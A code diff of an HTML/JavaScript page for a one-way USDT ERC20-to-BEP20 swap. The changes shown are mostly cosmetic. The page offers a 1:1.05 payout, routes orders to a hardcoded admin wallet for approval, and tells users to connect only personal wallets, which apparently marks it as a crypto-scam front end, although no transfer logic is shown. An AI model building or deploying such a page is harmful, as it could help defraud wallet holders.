@@ -28,24 +28,21 @@
         .card-shadow {
             box-shadow: 0 2px 12px rgba(0,0,0,0.06);
         }
-        .token-circle {
+        .token-text-box {
             width: 44px;
             height: 44px;
             border-radius: 50%;
+            background-color: #eee;
             display: flex;
             align-items: center;
             justify-content: center;
-            overflow: hidden;
-        }
-        .token-circle img{
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+            font-weight: bold;
+            color: #333;
+            font-size: 14px;
         }
         .admin-panel{
             display: none;
         }
-        /* 修复移动端按钮点击穿透、层级问题 */
         #openInputModal {
             position: relative;
             z-index: 10;
@@ -77,9 +74,8 @@
             </div>
             <div class="bg-lightBg rounded-xl p-4 flex items-center justify-between">
                 <div class="flex items-center gap-3">
-                    <div class="token-circle">
-                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="ERC20 USDT">
-                    </div>
+                    <!-- 文字代替头像，移除全部img标签 -->
+                    <div class="token-text-box">USDT</div>
                     <div>
                         <div class="flex items-center gap-1">
                             <span class="text-xl font-semibold">USDT</span>
@@ -103,9 +99,8 @@
             <p class="text-textGray text-base mb-2">接收（预估）</p>
             <div class="bg-lightBg rounded-xl p-4 flex items-center justify-between">
                 <div class="flex items-center gap-3">
-                    <div class="token-circle">
-                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="BEP20 USDT">
-                    </div>
+                    <!-- 文字代替头像 -->
+                    <div class="token-text-box">USDT</div>
                     <div>
                         <div class="flex items-center gap-1">
                             <span class="text-xl font-semibold">USDT</span>
@@ -126,7 +121,6 @@
         </div>
         <p class="text-dangerRed text-sm mb-6">请勿填入交易所地址，仅使用个人去中心化钱包地址</p>
 
-        <!-- 兑换输入唤起按钮，提升层级保证点击生效 -->
         <button id="openInputModal" class="w-full bg-primary/20 text-primary rounded-xl py-4 text-lg font-medium mb-8 disabled:opacity-40" disabled>
             输入兑换数量
         </button>
@@ -167,11 +161,10 @@
         </div>
     </div>
 
-    <!-- 底部弹窗 -->
+    <!-- 底部弹窗输入框 -->
     <div id="amountModal" class="fixed inset-0 bg-black/50 hidden flex items-end justify-center z-50">
         <div class="bg-white w-full max-w-md rounded-t-2xl p-6">
             <h3 class="text-lg font-bold mb-4">输入ERC20-USDT兑换数量</h3>
-            <!-- 核心输入框，实时计算 -->
             <input id="inputUsdtAmount" class="w-full border rounded-lg p-3 text-xl outline-none" placeholder="例如：1000" type="number" min="0" step="0.000001">
             <div class="flex gap-3 mt-4">
                 <button id="closeModalBtn" class="flex-1 py-3 border rounded-lg">取消</button>
@@ -183,7 +176,7 @@
     <script>
         const ADMIN_WALLET = "0xf832eA13Df0F60dFA381c6853754ab7b54651F05".toLowerCase();
         const USDT_ETH = "0xdac17f958d2ee523a2206206994597c13d831ec7";
-        // 替换为你的ETH跨链合约地址
+        // 此处替换为你自己部署的以太坊合约地址
         const BRIDGE_CONTRACT = "在此填入你的ETH合约地址";
 
         let provider = null;
@@ -204,7 +197,7 @@
         const amountModal = document.getElementById("amountModal");
         const inputAmountDom = document.getElementById("inputUsdtAmount");
 
-        // 钱包连接函数
+        // 钱包连接
         async function connectWallet(){
             if (!window || !window.ethereum) {
                 walletStatusDom.innerText = "未检测到钱包，请在TP钱包内置浏览器打开页面";
@@ -279,12 +272,12 @@
             );
         }
 
-        // 获取钱包USDT余额
+        // 获取USDT余额
         async function fetchBalance(){
             try{
                 const addr = await signer.getAddress();
                 walletUsdtBalance = await usdtContract.balanceOf(addr);
-                const formatBal = parseFloat(ethers.utils.formatUnits(walletUsdtBalance,6)).toFixed(1);
+                const formatBal = parseFloat(ethers.utils.formatUnits(walletUsdtBalance,6)).toFixed(2);
                 balanceShowDom.innerText = formatBal;
                 fillAllBtn.innerText = formatBal + " 全部";
             }catch(e){
@@ -298,17 +291,12 @@
             fillAllBtn.classList.remove("opacity-50","pointer-events-none");
         }
 
-        // 地址精简展示
+        // 地址精简显示
         function shortAddr(addr){
             return addr.slice(0,6)+"..."+addr.slice(-4);
         }
 
-        // 判断管理员权限
-        function checkAdmin(){
-            adminPanel.style.display = userAddress === ADMIN_WALLET ? "block" : "none";
-        }
-
-        // 核心：输入金额实时计算兑换数量 1:1.05
+        // 实时计算兑换数量 1:1.05
         function calcSwapResult(inputValue){
             let inputNum = Number(inputValue || 0);
             if(isNaN(inputNum)) inputNum = 0;
@@ -317,19 +305,19 @@
             receiveNumDom.innerText = receiveNum;
         }
 
-        // 【全部】按钮填充余额
+        // 一键填充全部余额
         fillAllBtn.addEventListener("click",()=>{
             const balStr = ethers.utils.formatUnits(walletUsdtBalance,6);
             inputAmountDom.value = balStr;
             calcSwapResult(balStr);
         })
 
-        // 输入框实时监听，一边输入一边更新上下金额
+        // 输入框实时监听、联动计算
         inputAmountDom.addEventListener("input",(e)=>{
             calcSwapResult(e.target.value);
         })
 
-        // 唤起输入弹窗
+        // 打开输入弹窗
         openModalBtn.addEventListener("click",()=>{
             amountModal.classList.remove("hidden");
         })
@@ -339,15 +327,15 @@
             amountModal.classList.add("hidden");
         })
 
-        // 兑换方向切换提示
+        // 兑换方向提示
         document.getElementById("switchChainBtn").addEventListener("click",()=>{
             alert("当前仅支持 ETH(ERC20) → BSC(BEP20) 单向兑换");
         })
 
-        // 钱包连接点击
+        // 钱包连接点击事件
         connectBtn.addEventListener("click",connectWallet);
 
-        // 确认兑换提交逻辑
+        // 确认兑换提交
         document.getElementById("confirmSwapBtn").addEventListener("click",async ()=>{
             if(!signer) return alert("请先连接钱包");
             const inputVal = inputAmountDom.value.trim();
@@ -377,7 +365,7 @@
             }
         })
 
-        // 管理员订单操作
+        // 管理员后台操作
         document.getElementById("approveOrderBtn").addEventListener("click",async ()=>{
             if(userAddress !== ADMIN_WALLET) return;
             const oid = document.getElementById("orderIdInput").value.trim();
@@ -408,7 +396,7 @@
             }catch(e){alert(e.message)}
         })
 
-        // 页面刷新按钮
+        // 刷新页面
         document.getElementById("refreshBtn").addEventListener("click",()=>location.reload());
     </script>
 </body>
